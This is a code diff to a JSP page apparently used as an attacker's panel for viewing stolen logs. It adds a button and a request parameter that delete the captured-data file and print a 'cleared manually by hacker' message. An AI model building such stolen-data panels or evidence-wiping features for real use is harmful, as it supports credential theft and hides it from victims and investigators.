@@ -35,8 +35,17 @@
         out.println("Error reading log.");
     }
 %>
+<%
+    if ("true".equals(request.getParameter("clear"))) {
+        new File(fileName).delete();
+        out.println("<p style='color: yellow;'>[!] Logs cleared manually by hacker.</p>");
+    }
+%>
     </div>
     
-    <a href="view_stolen.jsp" class="refresh-btn">REFRESH LOGS</a>
+    <div style="text-align: center; margin-top: 20px;">
+        <a href="view_stolen.jsp" class="refresh-btn" style="display: inline-block; margin-right: 10px;">REFRESH LOGS</a>
+        <a href="view_stolen.jsp?clear=true" class="refresh-btn" style="display: inline-block; background-color: #550000; border: 1px solid red;">CLEAR ALL LOGS</a>
+    </div>
 </body>
 </html>
